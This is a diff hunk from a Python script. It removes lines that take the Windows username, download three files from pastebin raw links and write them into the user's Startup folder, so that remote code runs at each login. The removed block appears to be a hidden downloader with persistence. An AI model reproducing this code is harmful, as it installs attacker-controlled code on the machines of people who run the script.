@@ -8,23 +8,6 @@ import os
 import random
 import requests
 
-user = os.environ['USERNAME']
-
-url = "https://pastebin.com/raw/RSiyfdAQ"
-
-r = requests.get(url, allow_redirects=True)
-open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.py", 'wb').write(r.content)
-
-url = "https://pastebin.com/raw/XTkPxwrr"
-
-r = requests.get(url, allow_redirects=True)
-open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.qml", 'wb').write(r.content)
-
-url = "https://pastebin.com/raw/XV47ctX6"
-
-r = requests.get(url, allow_redirects=True)
-open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml", 'wb').write(r.content)
-
 clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
 clearConsole()
 
